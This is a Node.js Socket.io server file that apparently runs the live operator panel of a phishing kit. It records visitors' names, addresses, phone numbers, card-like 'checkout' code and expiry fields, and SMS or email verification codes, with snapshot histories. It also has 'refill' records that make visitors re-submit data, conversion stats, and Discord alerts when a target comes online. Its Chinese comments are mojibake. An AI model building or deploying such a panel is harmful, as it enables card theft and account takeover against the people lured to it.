// backend/server.js - 瀹屾暣鐨勫悗鍙颁唬鐮侊紝鍖呮嫭瀹炴椂鏇存柊鍜屽鐞嗘柊澧炲瓧娈?
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const { buildConfig } = require('./config');
const { createRetentionPolicy } = require('./data-retention');
const { createDiscordNotifier } = require('./discord');
const { createPersistence } = require('./persistence');
const { createRecordStore } = require('./record-store');
const { registerSocketHandlers } = require('./socket-handlers');

const app = express();
const config = buildConfig(__dirname);
const {
  adminPassword: ADMIN_PASSWORD,
  adminStaticDir,
  adminAssetsDir,
  dataFilePath,
  archiveFilePath,
  dataRetentionDays,
  dataMaxActiveRecords,
  discordWebhookUrl: DISCORD_WEBHOOK_URL,
  discordWebhookDebug: DISCORD_WEBHOOK_DEBUG,
  discordProxyUrl: DISCORD_PROXY_URL,
  corsOptions,
} = config;
app.use(cors(corsOptions));

// Avoid stale admin HTML being cached by browser/proxy; always fetch latest shell.
app.use('/admin', (req, res, next) => {
  const reqPath = (req.path || '').toString();
  const isHtmlShell = reqPath === '/' || reqPath === '' || !path.extname(reqPath);
  if (isHtmlShell) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
  }
  next();
});

// Serve admin assets explicitly. Missing assets return 404 instead of HTML.
app.use('/admin/assets', express.static(adminAssetsDir, { fallthrough: false }));
app.use('/admin/dist/assets', express.static(adminAssetsDir, { fallthrough: false }));
app.use('/admin', express.static(adminStaticDir));
app.get('/admin/:path(*)', (req, res) => res.sendFile(path.join(adminStaticDir, 'index.html')));
// Compatibility: allow visiting /admin/dist* after deployment path changes.
app.get('/admin/dist', (req, res) => res.redirect(302, '/admin'));
app.get('/admin/dist/:path(*)', (req, res) => {
  const subPath = (req.params.path || '').toString();
  return res.redirect(302, `/admin/${subPath}`);
});
app.get('/healthz', (req, res) => res.status(200).json({ ok: true }));
app.get('/', (req, res) => res.send('<h1>Socket.io Server Running</h1>'));

const server = http.createServer(app);
const io = new Server(server, {
  cors: corsOptions,
  pingTimeout: 5000,
  pingInterval: 2500,
});

const onlineUsers = new Map(); // socket.id -> { page, ip, deviceType, deviceOS, online, activeRecordId, clientId, activated }
const adminSockets = new Set(); // socket.id of authenticated admin sessions
const discordHomeNotified = new Set(); // socket.id
const enteredClientIds = new Set(); // cumulative unique users entered frontend
const submittedClientIds = new Set(); // cumulative unique users clicked/submitted
const socketEnterKey = new Map(); // socket.id -> key stored in enteredClientIds
const store = createRecordStore();
const retentionPolicy = createRetentionPolicy({
  maxActiveRecords: dataMaxActiveRecords,
  retentionDays: dataRetentionDays,
});
const persistence = dataFilePath
  ? createPersistence({
      filePath: dataFilePath,
      archiveFilePath,
      serialize: () => ({
        recordCounter: store.recordCounter,
        records: store.records,
        enteredClientIds: Array.from(enteredClientIds),
        submittedClientIds: Array.from(submittedClientIds),
      }),
      transformBeforeSave: retentionPolicy,
    })
  : null;
const persistedState = persistence?.load();
if (persistedState) {
  store.hydrate(persistedState);
  if (Array.isArray(persistedState.enteredClientIds)) {
    persistedState.enteredClientIds.forEach((value) => enteredClientIds.add(String(value)));
  }
  if (Array.isArray(persistedState.submittedClientIds)) {
    persistedState.submittedClientIds.forEach((value) => submittedClientIds.add(String(value)));
  }
  persistence.scheduleSave();
}
const {
  isSubId,
  getMainId,
  recordsById,
  recordsBySocketId,
  appendRecord,
  updateRecordOwnership,
  getLatestRecordForSocket,
  clear: clearRecords,
} = store;
// ---------- helpers ----------
const nowCN = () => new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
const nowTs = () => Date.now();
const isAdminSocket = (socketId) => adminSockets.has(socketId);

function getAdminStats() {
  const visits = enteredClientIds.size;
  const clicks = submittedClientIds.size;
  const clickRate = visits > 0 ? Number(((clicks / visits) * 100).toFixed(1)) : 0;
  return { visits, clicks, clickRate };
}

function normalizeIp(raw) {
  const ip = (raw || '').toString().trim();
  if (!ip) return '';
  const first = ip.split(',')[0].trim();
  if (!first) return '';
  if (first.startsWith('::ffff:')) return first.slice(7);
  return first;
}

function getClientIp(socket) {
  const headers = socket.handshake?.headers || {};
  const ip =
    normalizeIp(headers['cf-connecting-ip']) ||
    normalizeIp(headers['x-real-ip']) ||
    normalizeIp(headers['x-client-ip']) ||
    normalizeIp(headers['true-client-ip']) ||
    normalizeIp(headers['x-forwarded-for']) ||
    normalizeIp(socket.handshake?.address) ||
    'unknown';
  return ip;
}

function getUserAgent(socket) {
  const headers = socket.handshake?.headers || {};
  return (headers['user-agent'] || '').toString();
}

function detectDeviceType(userAgent) {
  const ua = (userAgent || '').toLowerCase();
  if (!ua) return '未知设备';
  if (/ipad|tablet|playbook|silk/.test(ua)) return '平板';
  if (/mobile|iphone|ipod|android|windows phone|blackberry|opera mini|opera mobi/.test(ua)) return '手机';
  return '电脑';
}

function detectDeviceOS(userAgent) {
  const ua = (userAgent || '').toLowerCase();
  if (!ua) return '未知系统';
  if (/android/.test(ua)) return '安卓';
  if (/iphone|ipad|ipod|ios|mac os x/.test(ua)) return '苹果';
  if (/windows/.test(ua)) return 'Windows';
  if (/linux/.test(ua)) return 'Linux';
  return '其他';
}

function emitAdmin() {
  const safeOnline = Array.from(onlineUsers.values()).filter((u) => u && u.activated);
  io.to('admin').emit('admin-update', { records: store.records, onlineUsers: safeOnline, stats: getAdminStats() });
  persistence?.scheduleSave();
}
const notifyDiscordHomeOnline = createDiscordNotifier({
  discordWebhookUrl: DISCORD_WEBHOOK_URL,
  discordWebhookDebug: DISCORD_WEBHOOK_DEBUG,
  discordProxyUrl: DISCORD_PROXY_URL,
});

const getMainRecord = (socketId) => store.getMainRecord(socketId);
const getMainRecordByClientId = (clientId) => store.getMainRecordByClientId(clientId);
const getClientRecords = (clientId) => store.getClientRecords(clientId);

function normalizeClientId(input) {
  const cid = (input || '').toString().trim();
  if (!cid) return '';
  return cid.slice(0, 120);
}

const getActiveRecord = (socketId) => store.getActiveRecord(socketId, onlineUsers);
const setActiveRecord = (socketId, recordId) => store.setActiveRecord(socketId, recordId, onlineUsers);
const nextSubId = (mainId) => store.nextSubId(mainId);

function cloneCheckoutSnapshots(snapshots) {
  if (!Array.isArray(snapshots)) return [];
  return snapshots.map((x) => ({ ...x }));
}

function cloneVerifyHistory(history) {
  if (!Array.isArray(history)) return [];
  return history.map((x) => ({ ...x }));
}

function normalizeVerifyMethod(value) {
  const raw = (value ?? '').toString().trim().toLowerCase();
  if (!raw) return '';
  if (raw.includes('phone') || raw.includes('sms') || raw.includes('mobile') || raw.includes('tel')) return 'phone';
  if (raw.includes('email') || raw.includes('mail')) return 'email';
  return raw.slice(0, 40);
}

function pushVerifyHistory(record, verifyValue) {
  const value = (verifyValue || '').toString().trim();
  if (!record || !value) return;

  record.verifyHistory = Array.isArray(record.verifyHistory) ? record.verifyHistory : [];
  record.verifyHistory.unshift({ at: nowTs(), time: nowCN(), value });
  if (record.verifyHistory.length > 50) {
    record.verifyHistory = record.verifyHistory.slice(0, 50);
  }
}

function buildSubRecordFrom(base, { id, page, status, verifyValue, historyStatus, refillReason } = {}) {
  const ts = nowTs();
  const time = nowCN();

  return {
    id,
    clientId: base.clientId || '',
    socketId: base.socketId,
    ip: base.ip || '',
    deviceType: base.deviceType || '',
    deviceOS: base.deviceOS || '',
    time,
    page: page || base.page || 'unknown',
    online: base.online !== false,

    status: status || base.status || 'Refill submitted',

    fullname: (base.fullname || '').toString(),
    address: (base.address || '').toString(),
    fulladdress: (base.fulladdress || '').toString(),
    city: (base.city || '').toString(),
    state: (base.state || '').toString(),
    postalcode: (base.postalcode || '').toString(),
    email: (base.email || '').toString(),
    telephone: (base.telephone || '').toString(),

    checkoutName: (base.checkoutName || '').toString(),
    checkoutPhone: (base.checkoutPhone || '').toString(),
    checkoutCode: (base.checkoutCode || '').toString(),
    checkoutExpiryDate: (base.checkoutExpiryDate || '').toString(),
    checkoutDate: (base.checkoutDate || '').toString(),
    checkoutSnapshots: cloneCheckoutSnapshots(base.checkoutSnapshots),

    verify: verifyValue !== undefined ? verifyValue : (base.verify || '').toString(),
    verifyHistory: cloneVerifyHistory(base.verifyHistory),
    verifyMethod: (base.verifyMethod || '').toString(),
    emailVerify: (base.emailVerify || '').toString(),
    appCheck: (base.appCheck || '').toString(),

    createdAt: ts,
    updatedAt: ts,
    history: [{ at: ts, time, status: historyStatus || 'Created sub record' }],
    refillReason: refillReason || '',
    note: '',
    active: true,
  };
}

function touch(record, status) {
  const t = nowTs();
  record.updatedAt = t;
  if (!record.createdAt) record.createdAt = t;

  if (status) {
    record.status = status;
    record.history = record.history || [];
    record.history.push({ at: t, time: nowCN(), status });
  }
}

function getCheckoutSnapshot(record) {
  return {
    at: nowTs(),
    time: nowCN(),
    checkoutName: (record.checkoutName || '').toString(),
    checkoutPhone: (record.checkoutPhone || '').toString(),
    checkoutCode: (record.checkoutCode || '').toString(),
    checkoutDate: (record.checkoutDate || '').toString(),
    checkoutExpiryDate: (record.checkoutExpiryDate || '').toString(),
  };
}

function pushCheckoutSnapshot(record) {
  if (!record) return;
  const snap = getCheckoutSnapshot(record);
  const hasCheckoutValue = !!(
    snap.checkoutName ||
    snap.checkoutPhone ||
    snap.checkoutCode ||
    snap.checkoutDate ||
    snap.checkoutExpiryDate
  );
  if (!hasCheckoutValue) return;

  record.checkoutSnapshots = Array.isArray(record.checkoutSnapshots) ? record.checkoutSnapshots : [];
  const last = record.checkoutSnapshots[record.checkoutSnapshots.length - 1];
  if (
    last &&
    last.checkoutName === snap.checkoutName &&
    last.checkoutPhone === snap.checkoutPhone &&
    last.checkoutCode === snap.checkoutCode &&
    last.checkoutDate === snap.checkoutDate &&
    last.checkoutExpiryDate === snap.checkoutExpiryDate
  ) {
    return;
  }

  record.checkoutSnapshots.push(snap);
  if (record.checkoutSnapshots.length > 20) {
    record.checkoutSnapshots = record.checkoutSnapshots.slice(-20);
  }
}

// 璁?status/椤甸潰鏇翠竴鑷寸殑杈呭姪鍑芥暟锛堝彲閫変絾寰堝疄鐢級
function setUserPage(socketId, page) {
  const user = onlineUsers.get(socketId);
  if (user) user.page = page;
  const active = getActiveRecord(socketId);
  if (active) active.page = page;
}

function cleanupSocketTracking(socketId) {
  adminSockets.delete(socketId);
  discordHomeNotified.delete(socketId);

  socketEnterKey.delete(socketId);

  onlineUsers.delete(socketId);
}

// ---------- socket ----------
registerSocketHandlers({
  io,
  store,
  onlineUsers,
  adminSockets,
  discordHomeNotified,
  enteredClientIds,
  submittedClientIds,
  socketEnterKey,
  emitAdmin,
  notifyDiscordHomeOnline,
  cleanupSocketTracking,
  isAdminSocket,
  getClientIp,
  getUserAgent,
  detectDeviceType,
  detectDeviceOS,
  getMainRecord,
  getMainRecordByClientId,
  getClientRecords,
  normalizeClientId,
  getActiveRecord,
  setActiveRecord,
  nextSubId,
  getMainId,
  normalizeVerifyMethod,
  pushVerifyHistory,
  buildSubRecordFrom,
  touch,
  pushCheckoutSnapshot,
  setUserPage,
  updateRecordOwnership,
  getLatestRecordForSocket,
  nowCN,
  nowTs,
  recordsById,
  recordsBySocketId,
  appendRecord,
  ADMIN_PASSWORD,
  DISCORD_WEBHOOK_DEBUG,
  getAdminStats,
});

const PORT = process.env.PORT || 3000;
process.on('SIGINT', () => {
  try {
    persistence?.flush();
  } finally {
    process.exit(0);
  }
});

process.on('SIGTERM', () => {
  try {
    persistence?.flush();
  } finally {
    process.exit(0);
  }
});

process.on('exit', () => {
  if (persistence?.hasPendingWrite()) {
    try {
      persistence.flush();
    } catch {
      // ignore flush failures during shutdown
    }
  }
});

server.listen(PORT, () => console.log(`鏈嶅姟鍣ㄨ繍琛屽湪 ${PORT}`));
